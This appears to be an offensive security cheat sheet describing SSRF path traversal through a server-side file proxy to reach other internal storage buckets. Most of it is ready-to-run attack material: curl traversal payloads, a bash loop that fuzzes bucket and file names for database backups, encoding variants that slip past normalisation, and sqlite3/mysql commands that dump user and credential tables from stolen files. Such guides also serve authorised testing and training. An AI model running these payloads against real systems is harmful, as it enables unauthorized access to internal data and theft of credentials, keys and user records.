# SSRF — Proxy Path Traversal (Server-Side File Proxy)

## When this applies

- Application proxies user requests to an internal service via a path-prefixed proxy (`/api/s3/<key>` → `internal-s3:9000/<bucket>/<key>`).
- Proxy uses string concatenation; `..` segments aren't normalized.
- Goal: traverse to a different internal bucket / path / service via the proxy.

## Technique

Inject `..%2f` into the proxied path so the internal request escapes the intended scope. Discover internal buckets/services and download sensitive files (database backups, config files).

## Steps

### Discover proxy endpoints

Common patterns:
- `<img src="/api/s3/photo.jpg">` — HTML reveals proxy path
- `/api/files/<id>`, `/api/avatar/<file>`, `/proxy/<url>`

### Path traversal payloads

```bash
# Traverse from assets/ to backups/ bucket
curl http://target/api/s3/..%2Fbackups%2Fdatabase.db -o database.db

# Fuzz bucket/file combinations
for bucket in backups backup data db; do
  for file in app.db database.db backup.db users.db dump.sql; do
    SIZE=$(curl -s "http://target/api/s3/..%2F${bucket}%2F${file}" | wc -c)
    [ "$SIZE" -gt 100 ] && echo "[+] $bucket/$file: $SIZE bytes"
  done
done
```

### Common bucket names to enumerate

```
assets, backups, backup, data, db, database, dump, dumps, exports,
files, images, internal, logs, media, private, public, secrets,
static, storage, temp, uploads, users
```

### Database file content of interest

- Database backups (`.db`, `.sql`, `.dump`, `.bak`) — extract credentials, user data
- Configuration files (`.env`, `.yml`, `.json`, `.conf`) — extract secrets, API keys
- Source code archives (`.tar.gz`, `.zip`) — review for vulnerabilities
- Log files — extract session tokens, internal paths
- Private keys (`.pem`, `.key`) — direct authentication

### Database backup extraction

```bash
# SQLite
sqlite3 downloaded.db ".tables"
sqlite3 downloaded.db "SELECT * FROM users;"

# MySQL dump
mysql -u root < dump.sql
```

### Encoding variants for traversal

```bash
# URL-encoded forward slash
..%2Fbackups
%2E%2E%2Fbackups

# Double-encoded (when the proxy URL-decodes once)
..%252Fbackups
%252E%252E%252Fbackups

# Mixed (when one decode happens at frontend, another at proxy)
..%2F  → first decode → ../
```

## Verifying success

- Response returns content from a different bucket/path than expected.
- Downloaded file passes its expected magic-bytes check (SQLite `SQLite format 3`, gzip `1f 8b`).
- File contents include credentials / data not normally accessible.

## Common pitfalls

- Proxies that normalize `..` away need double-encoding (`%252F`).
- Some proxies strip the path beyond the prefix — the payload must terminate at the prefix boundary.
- Some proxies sign URLs — traversal won't reach beyond the signed path.

## Tools

- Burp Suite Repeater + Intruder
- ffuf (bucket/file wordlists)
- curl
- sqlite3, mysql client (analyze recovered DBs)
